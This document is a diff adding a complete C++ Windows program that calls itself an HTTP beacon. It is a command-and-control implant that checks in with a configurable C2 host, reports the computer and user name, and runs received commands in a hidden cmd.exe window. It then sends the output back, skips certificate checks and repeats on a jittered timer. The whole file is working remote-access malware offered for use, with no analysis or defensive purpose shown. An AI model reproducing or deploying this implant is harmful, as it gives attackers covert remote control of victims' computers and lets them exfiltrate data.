@@ -1,0 +1,124 @@
+// language: C++, file: agent.cpp, target: Windows 11, MSVC
+// *Lean HTTP beacon — checks in, receives commands, executes, returns output*
+#include <windows.h>
+#include <winhttp.h>
+#include <string>
+#include <vector>
+#include <iostream>
+#pragma comment(lib, "winhttp.lib")
+
+// --- CONFIG ---
+const std::wstring C2_HOST = L"yourdomain.com"; // No http:// or https://
+const INTERNET_PORT C2_PORT = 443;              // 443 for HTTPS, 80 for HTTP
+const std::wstring C2_PATH = L"/api/beacon";
+const std::wstring USER_AGENT = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+
+// Helper to convert wide string to utf8 for WinHTTP
+std::string WStringToString(const std::wstring& wstr) {
+    if (wstr.empty()) return std::string();
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    std::string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
+std::string ExecuteCommand(const std::string& cmd) {
+    std::string output;
+    HANDLE hRead, hWrite;
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";
+
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+    si.wShowWindow = SW_HIDE;
+
+    std::string fullCmd = "cmd.exe /c " + cmd;
+    if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(hWrite);
+        char buffer[4096];
+        DWORD bytesRead;
+        while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+            buffer[bytesRead] = '\0';
+            output += buffer;
+        }
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    CloseHandle(hRead);
+    return output;
+}
+
+std::string HttpPost(const std::wstring& path, const std::string& data) {
+    std::string response;
+    HINTERNET hSession = WinHttpOpen(USER_AGENT.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return response;
+
+    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST.c_str(), C2_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return response; }
+
+    DWORD flags = (C2_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return response; }
+
+    // Ignore invalid certs for self-signed C2s (remove for production Let's Encrypt)
+    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+
+    std::wstring headers = L"Content-Type: text/plain\r\n";
+    WinHttpSendRequest(hRequest, headers.c_str(), -1L, (LPVOID)data.c_str(), (DWORD)data.length(), (DWORD)data.length(), 0);
+    WinHttpReceiveResponse(hRequest, NULL);
+
+    DWORD dwSize = 0;
+    do {
+        dwSize = 0;
+        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+        if (dwSize == 0) break;
+
+        std::vector<char> buffer(dwSize + 1);
+        DWORD dwDownloaded = 0;
+        if (WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
+            response.append(buffer.data(), dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+    return response;
+}
+
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+    // Basic single-instance or sleep obfuscation would go here
+    
+    while (true) {
+        // Identify ourselves (Computer Name + User)
+        char compName[256];
+        DWORD compSize = sizeof(compName);
+        GetComputerNameA(compName, &compSize);
+        char userName[256];
+        DWORD userSize = sizeof(userName);
+        GetUserNameA(userName, &userSize);
+
+        std::string beaconData = "CHECKIN|" + std::string(compName) + "|" + std::string(userName);
+
+        // Check for commands
+        std::string response = HttpPost(C2_PATH, beaconData);
+
+        if (!response.empty() && response != "OK" && response != "NO_CMD") {
+            // Assume C2 sent a command
+            std::string cmdOutput = ExecuteCommand(response);
+            
+            // Send output back
+            std::string exfilData = "OUTPUT|" + std::string(compName) + "|" + cmdOutput;
+            HttpPost(C2_PATH + L"/output", exfilData);
+        }
+
+        // Sleep 5-10 seconds, with jitter
+        Sleep(5000 + (rand() % 5000));
+    }
+    return 0;
+}
